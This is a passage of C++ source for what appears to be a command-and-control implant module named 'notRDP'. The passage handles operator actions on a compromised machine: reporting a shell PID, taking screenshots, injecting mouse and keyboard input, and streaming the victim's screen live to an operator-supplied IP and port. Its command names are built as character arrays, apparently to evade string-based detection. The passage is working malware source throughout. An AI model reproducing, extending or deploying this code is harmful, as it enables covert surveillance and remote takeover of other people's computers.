                              'p', 'i', 'd', '=', 0};
      memory::copy(okbuf + bi, (void *)shell_s, 20);
      bi += 9;
      v = state->shell_pid;
      di = 0;
      if (v == 0)
        digits[di++] = '0';
      while (v > 0) {
        digits[di++] = static_cast<char>('0' + (v % 10));
        v /= 10;
      }
      for (int k = di - 1; k >= 0; k--)
        okbuf[bi++] = digits[k];
      okbuf[bi] = 0;
      queue_response(inst, task_uuid, RESPONSE_SUCCESS,
                     symbol<char *>(const_cast<char *>(okbuf)));
    }

    /* ── SHOT ── */
  } else {
    char shot_s[] = {'s', 'h', 'o', 't', 0};
    if (str_ncmp(action, shot_s, 4) == 0) {
      auto state = static_cast<NotRdpState *>(inst.notrdp_state_ptr);
      if (!state || !state->active) {
        queue_response(
            inst, task_uuid, RESPONSE_ERROR,
            symbol<char *>(const_cast<char *>("notRDP not started")));
        return;
      }
      nr_capture(inst, state, task_uuid);

      /* ── INPUT ── */
    } else {
      char input_s[] = {'i', 'n', 'p', 'u', 't', 0};
      if (str_ncmp(action, input_s, 5) == 0) {
        auto state = static_cast<NotRdpState *>(inst.notrdp_state_ptr);
        if (!state || !state->active) {
          queue_response(
              inst, task_uuid, RESPONSE_ERROR,
              symbol<char *>(const_cast<char *>("notRDP not started")));
          return;
        }
        int32_t x = static_cast<int32_t>(parser_int32(params));
        int32_t y = static_cast<int32_t>(parser_int32(params));
        int32_t act = static_cast<int32_t>(parser_int32(params));
        int32_t key = static_cast<int32_t>(parser_int32(params));
        nr_input(inst, state, x, y, act, key);
        queue_response(inst, task_uuid, RESPONSE_SUCCESS,
                       symbol<char *>(const_cast<char *>("input sent")));

        /* ── LIVE ── */
      } else {
        char live_s[] = {'l', 'i', 'v', 'e', 0};
        if (str_ncmp(action, live_s, 4) == 0) {
          auto state = static_cast<NotRdpState *>(inst.notrdp_state_ptr);
          if (!state || !state->active) {
            queue_response(
                inst, task_uuid, RESPONSE_ERROR,
                symbol<char *>(const_cast<char *>("notRDP not started")));
            return;
          }

          uint32_t host_len = 0;
          auto host_arg = parser_string(params, &host_len);
          if (!host_arg || host_len == 0 || host_len >= 64) {
            queue_response(inst, task_uuid, RESPONSE_ERROR,
                           symbol<char *>(const_cast<char *>(
                               "live needs <ip> <port> [fps] [scale]")));
            return;
          }

          char host_buf[64];
          memory::zero(host_buf, sizeof(host_buf));
          memory::copy(host_buf, host_arg, host_len);
          host_buf[host_len] = 0;

          char stop_s2[] = {'s', 't', 'o', 'p', 0};
          if (host_len == 4 && str_ncmp(host_buf, stop_s2, 4) == 0) {
            nr_live_stop(inst, state);
            queue_response(inst, task_uuid, RESPONSE_SUCCESS,
                           symbol<char *>(const_cast<char *>("live stopped")));
            return;
          }

          int32_t port = static_cast<int32_t>(parser_int32(params));
          int32_t fps = static_cast<int32_t>(parser_int32(params));
          int32_t scale = static_cast<int32_t>(parser_int32(params));
          if (port <= 0 || port > 65535) {
            queue_response(inst, task_uuid, RESPONSE_ERROR,
                           symbol<char *>(const_cast<char *>("bad port")));
            return;
          }
          if (fps < 0 || fps > 10) {
            queue_response(
                inst, task_uuid, RESPONSE_ERROR,
                symbol<char *>(const_cast<char *>("fps must be 1-10")));
            return;
          }
          if (scale < 0 || scale > 4) {
            queue_response(
                inst, task_uuid, RESPONSE_ERROR,
                symbol<char *>(const_cast<char *>("scale must be 1-4")));
            return;
          }
          if (fps == 0)
            fps = 2;
          if (scale == 0)
            scale = 1;
          if (!nr_live_start(inst, state, host_buf, (uint32_t)port,
                             (uint32_t)fps, (uint32_t)scale)) {
            queue_response(
                inst, task_uuid, RESPONSE_ERROR,
                symbol<char *>(const_cast<char *>("live thread failed")));
            return;
          }
          queue_response(inst, task_uuid, RESPONSE_SUCCESS,
                         symbol<char *>(const_cast<char *>(
                             "live started, connecting to viewer")));

        } else {
          char stop_s[] = {'s', 't', 'o', 'p', 0};
          if (str_ncmp(action, stop_s, 4) == 0) {
            auto state = static_cast<NotRdpState *>(inst.notrdp_state_ptr);
            if (!state) {
              queue_response(
                  inst, task_uuid, RESPONSE_ERROR,
                  symbol<char *>(const_cast<char *>("notRDP not running")));
              return;
            }
            nr_stop(inst, state);
            queue_response(
                inst, task_uuid, RESPONSE_SUCCESS,
                symbol<char *>(const_cast<char *>("notRDP stopped")));
          } else {
            queue_response(
                inst, task_uuid, RESPONSE_ERROR,
                symbol<char *>(const_cast<char *>("unknown action")));
          }
        }
      }
    }
  }
}

#endif /* INCLUDE_CMD_NOTRDP */
